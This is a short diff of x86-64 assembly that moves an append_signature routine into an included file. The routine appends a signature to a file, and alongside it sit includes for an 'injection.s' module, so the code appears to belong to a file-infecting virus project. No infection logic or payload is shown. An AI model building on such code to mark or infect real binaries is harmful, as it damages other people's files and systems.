@@ -40,25 +40,14 @@ jump:
     nop
     nop
 
+
+
 %include "injection.s"
 
 %include "ft_memcpy.s"
 
 %include "ft_strcmp.s"
 
-;  void append_signature(char *name)
-append_signature:
-    mov rsi, O_RDWR | O_APPEND
-    mov rax, SYS_OPEN
-    syscall
-    mov rdi, rax 
-    lea rsi, [rel signature]
-    mov rdx, SIGNATURE_SIZE
-    mov rax, SYS_WRITE
-    syscall
-    mov rax, SYS_CLOSE
-    syscall
-    ret
-
+%include "append.s"
 
 %include "data.s"
